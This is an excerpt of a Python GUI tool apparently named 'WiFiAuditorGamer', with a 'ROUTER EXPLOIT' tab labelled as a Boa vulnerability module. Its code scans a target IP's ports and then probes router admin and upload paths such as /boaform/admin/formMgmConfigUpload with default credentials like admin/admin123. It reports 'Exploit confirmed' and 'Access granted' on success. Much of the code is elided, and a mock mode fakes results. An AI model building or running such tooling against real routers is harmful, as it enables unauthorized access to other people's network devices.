...
class WiFiAuditorGamer(ctk.CTk):
    ...
    def setup_ui(self):
        ...
        # Tabview
        self.tabview = ctk.CTkTabview(self.main_frame, fg_color="#0D0D0D", segmented_button_selected_color=NEON_GREEN, segmented_button_unselected_color="#1A1A1A", segmented_button_selected_hover_color=NEON_CYAN)
        self.tabview.grid(row=0, column=0, sticky="nsew", padx=5, pady=5)
        self.tabview.add("WIFI AUDIT")
        self.tabview.add("ROUTER EXPLOIT")

        self.tab_wifi = self.tabview.tab("WIFI AUDIT")
        self.tab_wifi.grid_columnconfigure(0, weight=1)
        self.tab_exploit = self.tabview.tab("ROUTER EXPLOIT")
        self.tab_exploit.grid_columnconfigure(0, weight=1)

        # Exploit Configuration
        self.exploit_frame = ctk.CTkFrame(self.tab_exploit, border_color=NEON_GREEN, border_width=1, fg_color="#121212")
        self.exploit_frame.grid(row=0, column=0, sticky="nsew", pady=5, padx=5)
        self.exploit_frame.grid_columnconfigure(1, weight=1)

        self.exploit_header = ctk.CTkLabel(self.exploit_frame, text="ROUTER EXPLOIT MODULE (BOA VULN)", font=ctk.CTkFont(size=16, weight="bold"), text_color=NEON_GREEN)
        self.exploit_header.grid(row=0, column=0, columnspan=2, padx=15, pady=10, sticky="w")

        # Target IP
        ctk.CTkLabel(self.exploit_frame, text="TARGET IP:").grid(row=1, column=0, padx=15, pady=5, sticky="e")
        self.exploit_ip_entry = ctk.CTkEntry(self.exploit_frame, placeholder_text="e.g. 192.168.1.1", border_color=NEON_GREEN)
        self.exploit_ip_entry.grid(row=1, column=1, padx=15, pady=5, sticky="ew")

        # Ports
        ctk.CTkLabel(self.exploit_frame, text="PORTS:").grid(row=2, column=0, padx=15, pady=5, sticky="e")
        self.exploit_ports_entry = ctk.CTkEntry(self.exploit_frame, placeholder_text="80, 443, 8080", border_color=NEON_GREEN)
        self.exploit_ports_entry.insert(0, "80, 443, 8080, 8443, 8081, 8888, 8000, 81, 88")
        self.exploit_ports_entry.grid(row=2, column=1, padx=15, pady=5, sticky="ew")

        # Credentials
        ctk.CTkLabel(self.exploit_frame, text="USER:").grid(row=3, column=0, padx=15, pady=5, sticky="e")
        self.exploit_user_entry = ctk.CTkEntry(self.exploit_frame, placeholder_text="admin", border_color=NEON_GREEN)
        self.exploit_user_entry.insert(0, "admin")
        self.exploit_user_entry.grid(row=3, column=1, padx=15, pady=5, sticky="ew")

        ctk.CTkLabel(self.exploit_frame, text="NEW PASS:").grid(row=4, column=0, padx=15, pady=5, sticky="e")
        self.exploit_pass_entry = ctk.CTkEntry(self.exploit_frame, placeholder_text="password123", border_color=NEON_GREEN, show="*")
        self.exploit_pass_entry.insert(0, "admin123")
        self.exploit_pass_entry.grid(row=4, column=1, padx=15, pady=5, sticky="ew")

        # Exploit Actions
        self.exploit_btn = ctk.CTkButton(self.exploit_frame, text="SCAN & EXPLOIT", command=self.run_exploit, fg_color=NEON_GREEN, text_color="black", font=ctk.CTkFont(weight="bold"), hover_color="#00CC00")
        self.exploit_btn.grid(row=5, column=0, columnspan=2, padx=15, pady=20, sticky="ew")

        self.exploit_progress = ctk.CTkProgressBar(self.exploit_frame, orientation="horizontal", progress_color=NEON_GREEN)
        self.exploit_progress.set(0)
        self.exploit_progress.grid(row=6, column=0, columnspan=2, padx=15, pady=(0, 15), sticky="ew")

        # Scanning Controls
        self.scan_frame = ctk.CTkFrame(self.tab_wifi, border_color=NEON_CYAN, border_width=1, fg_color="#121212")
        ...
        self.attack_frame = ctk.CTkFrame(self.tab_wifi, border_color=BLOOD_RED, border_width=1, fg_color="#121212")
        ...
        # Log Terminal
        self.log_textbox = ctk.CTkTextbox(self.main_frame, height=250, border_color=NEON_GREEN, border_width=1, font=ctk.CTkFont(family="Courier", size=13), fg_color="#050505", text_color=NEON_GREEN)
        self.log_textbox.grid(row=1, column=0, sticky="nsew", pady=15, padx=5)
    ...
    def run_exploit(self):
        ...
        ports_str = self.exploit_ports_entry.get()
        try:
            ports = [int(p.strip()) for p in ports_str.split(",") if p.strip()]
        except ValueError:
            messagebox.showerror("Error", "Invalid ports format. Use comma-separated numbers.")
            return

        username = self.exploit_user_entry.get()
        password = self.exploit_pass_entry.get()

        self.exploit_btn.configure(state="disabled", text="EXPLOITING...")
        self.exploit_progress.set(0)
        self.log(f"Starting Boa Exploit sequence on {target_ip}")

        threading.Thread(target=self.exploit_thread_func, args=(target_ip, ports, username, password), daemon=True).start()

    def exploit_thread_func(self, ip, ports, user, pwd):
        admin_paths = [
            "/admin/status.asp",
            "/status.asp",
            "/cgi-bin/status",
            ...
            "/login.asp",
            "/admin/login.asp",
            "/boaform/admin/formMgmConfigUpload"
        ]

        open_ports = []
        total_steps = len(ports) + (len(ports) * len(admin_paths))
        current_step = 0

        # Port Scanning
        self.log(f"[*] Scanning {len(ports)} ports on {ip}...")
        for port in ports:
            if self.mock_mode:
                time.sleep(0.1)
                if port in [80, 443]: open_ports.append(port)
            else:
                try:
            ...
            current_step += 1
            self.exploit_progress.set(current_step / total_steps)

        if not open_ports:
            self.log("[-] No open ports found.")
            self.after(0, lambda: self.finish_exploit(False))
            return

        # Path Probing & Exploit
        success = False
        for port in open_ports:
            ...
            for path in admin_paths:
                target_url = f"{protocol}://{ip}:{port}{path}"
                self.log(f"[*] Probing: {target_url}")

                if self.mock_mode:
                    time.sleep(0.5)
                    if port == 80 and path == "/admin/status.asp":
                        success = True
                else:
                    try:
                        if use_https:
                        ...
                        auth_handler.add_password(realm=None, uri=f"{protocol}://{ip}:{port}", user=user, passwd=pwd)
                        ...
                        if e.code == 401: self.log(f"    -> 401 Unauthorized")
                        else: self.log(f"    -> HTTP Error {e.code}")
                    except Exception as e:
                ...
                self.exploit_progress.set(current_step / total_steps)
                if success:
                    self.log(f"[!!!] SUCCESS! Exploit confirmed on {target_url}")
                    self.log(f"[!!!] Access granted with {user}:{pwd}")
                    break

        self.after(0, lambda: self.finish_exploit(success))

    def finish_exploit(self, success):
        self.exploit_btn.configure(state="normal", text="SCAN & EXPLOIT")
        self.exploit_progress.set(1 if success else 0)
        if success:
            messagebox.showinfo("Exploit Success", "The router appears to be vulnerable and access was confirmed!")
        else:
            messagebox.showwarning("Exploit Failed", "Could not confirm vulnerability on the specified target.")
